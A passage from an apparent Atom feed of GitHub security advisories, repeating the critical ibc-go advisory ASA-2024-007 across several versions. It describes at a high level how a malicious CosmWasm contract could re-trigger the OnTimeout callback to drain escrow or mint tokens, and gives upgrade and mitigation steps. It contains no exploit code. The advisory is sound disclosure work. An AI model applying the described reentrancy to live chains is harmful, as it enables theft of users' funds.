<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v8] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v7] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v6] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v5] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
</feed>